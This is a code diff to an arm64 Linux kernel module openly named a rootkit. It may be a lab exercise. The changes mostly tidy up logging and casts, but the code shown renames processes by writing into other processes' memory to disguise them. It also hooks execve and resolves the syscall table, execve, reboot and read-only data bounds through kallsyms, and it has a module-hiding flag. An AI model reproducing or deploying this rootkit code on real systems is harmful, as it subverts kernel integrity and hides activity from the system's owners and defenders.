@@ -24,6 +24,7 @@ static int major;
 struct cdev *kernel_cdev;
 
 long is_hide;
+char path[PATH_MAX];
 
 struct list_head *modules_;
 int (*access_remote_vm_)(struct mm_struct *mm, unsigned long addr,
@@ -37,23 +38,21 @@ unsigned long __start_rodata_, __end_rodata_;
 
 static int rootkit_open(struct inode *inode, struct file *filp)
 {
-	printk(KERN_INFO "%s\n", __func__);
+	pr_info("%s\n", __func__);
 	return 0;
 }
 
 static int rootkit_release(struct inode *inode, struct file *filp)
 {
-	printk(KERN_INFO "%s\n", __func__);
+	pr_info("%s\n", __func__);
 	return 0;
 }
 
 long hook_execve(const struct pt_regs *regs)
 {
-	char path[PATH_MAX];
-
-	if (copy_from_user(path, regs->regs[0], PATH_MAX))
-		printk(KERN_INFO "copy_from_user fail.\n");
-	printk(KERN_INFO "exec %s\n", path);
+	if (copy_from_user(path, (void *)regs->regs[0], PATH_MAX))
+		pr_info("copy_from_user fail.\n");
+	pr_info("exec %s\n", path);
 	return __arm64_sys_execve_(regs);
 }
 
@@ -102,7 +101,6 @@ static void rename_process(long len, struct masq_proc *masq)
 			continue;
 		access_mm_name(mm, task_name, MASQ_LEN, FOLL_GET);
 		task_name[MASQ_LEN - 1] = 0;
-		// printk(KERN_INFO "| %s\n", task_name);
 
 		for (i = 0; i < len; ++i) {
 			if (!masq[i].orig_name[0])
@@ -110,7 +108,6 @@ static void rename_process(long len, struct masq_proc *masq)
 			if (!strcmp(task_name, masq[i].orig_name)) {
 				access_mm_name(mm, masq[i].new_name,
 				strlen(masq[i].orig_name), FOLL_WRITE);
-				// printk(KERN_INFO "%s >> %s\n", masq[i].orig_name, masq[i].new_name);
 				break;
 			}
 		}
@@ -144,22 +141,21 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
 		if (copy_from_user(&masq_req,
 				 (struct masq_proc_req __user *) arg,
 				 sizeof(struct masq_proc_req))) {
-			printk(KERN_INFO "First copy_from_user fail.\n");
+			pr_info("First copy_from_user fail.\n");
 			ret = -EINVAL;
 			break;
 		}
-		// printk(KERN_INFO "%ld %px\n", masq_req.len, masq_req.list);
+		// pr_info("%ld %px\n", masq_req.len, masq_req.list);
 		masq = kmalloc(sizeof(struct masq_proc) * masq_req.len,
 			GFP_KERNEL);
 		if (masq == NULL) {
-			printk(KERN_INFO "kmalloc fail.\n");
 			ret = -EINVAL;
 			break;
 		}
 		if (copy_from_user(masq,
 			(struct masq_proc __user *) masq_req.list,
 			sizeof(struct masq_proc) * masq_req.len)) {
-			printk(KERN_INFO "Second copy_from_user fail.\n");
+			pr_info("Second copy_from_user fail.\n");
 			ret = -EINVAL;
 			break;
 		}
@@ -170,15 +166,15 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
 		ret = -EINVAL;
 	}
 
-	printk(KERN_INFO "%s\n", __func__);
+	pr_info("%s\n", __func__);
 	return ret;
 }
 
-struct file_operations fops = {
-	open: rootkit_open,
-	unlocked_ioctl : rootkit_ioctl,
-	release : rootkit_release,
-	owner : THIS_MODULE
+const struct file_operations fops = {
+open: rootkit_open,
+unlocked_ioctl : rootkit_ioctl,
+release : rootkit_release,
+owner : THIS_MODULE
 };
 
 static void ksym_lookup(void)
@@ -202,14 +198,14 @@ static void ksym_lookup(void)
 		(void *)kallsyms_lookup_name("__arm64_sys_execve");
 	__arm64_sys_reboot_ =
 		(void *)kallsyms_lookup_name("__arm64_sys_reboot");
-	__start_rodata_ = (void *)kallsyms_lookup_name("__start_rodata");
-	__end_rodata_ = (void *)kallsyms_lookup_name("__end_rodata");
+	__start_rodata_ = (unsigned long)kallsyms_lookup_name("__start_rodata");
+	__end_rodata_ = (unsigned long)kallsyms_lookup_name("__end_rodata");
 
-	printk(KERN_INFO "%px\n", modules_);
-	printk(KERN_INFO "%px\n", sys_call_table_);
-	printk(KERN_INFO "%px %px\n", sys_call_table_[__NR_execve], __arm64_sys_execve_);
-	printk(KERN_INFO "%px %px\n", sys_call_table_[__NR_reboot], __arm64_sys_reboot_);
-	printk(KERN_INFO "%px %px\n", __start_rodata_, __end_rodata_);
+	pr_info("%p\n", modules_);
+	pr_info("%p\n", sys_call_table_);
+	pr_info("%p %p\n", sys_call_table_[__NR_execve], __arm64_sys_execve_);
+	pr_info("%p %p\n", sys_call_table_[__NR_reboot], __arm64_sys_reboot_);
+	pr_info("%p %p\n", (void *)__start_rodata_, (void *)__end_rodata_);
 }
 
 static int __init rootkit_init(void)
@@ -229,7 +225,7 @@ static int __init rootkit_init(void)
 
 	major = MAJOR(dev_no);
 	dev = MKDEV(major, 0);
-	printk(KERN_INFO "The major number for your device is %d\n", major);
+	pr_info("The major number for your device is %d\n", major);
 	ret = cdev_add(kernel_cdev, dev, 1);
 	if (ret < 0) {
 		pr_info("unable to allocate cdev");
